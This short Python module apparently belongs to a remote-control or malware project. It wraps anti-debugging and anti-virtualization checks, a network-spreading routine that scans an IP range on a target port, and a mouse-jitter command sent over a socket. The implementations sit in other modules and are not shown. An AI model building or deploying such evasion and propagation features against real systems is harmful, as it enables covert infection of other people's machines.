from Features.AntiDebug.DebuggingCheck import IsDebugging
from Features.AntiVirtualization.VirtualizingCheck import IsVirtualizing
from Features.Infection import simulate_malware_spread
from Features.Jitter import jitter

class Features:
    def is_debugging(self):
        return IsDebugging()
    
    def is_virtualizing(self):
        return IsVirtualizing()

    def infecting(self, sock, network_prefix=None, target_port=80, start_ip=1, end_ip=100, delay=0.1):
        simulate_malware_spread(sock, network_prefix, target_port, start_ip, end_ip, delay)
        
    def mouser_jitter(self, sock):
        jitter(sock, duration_time=1.5, sleep_time=0.5)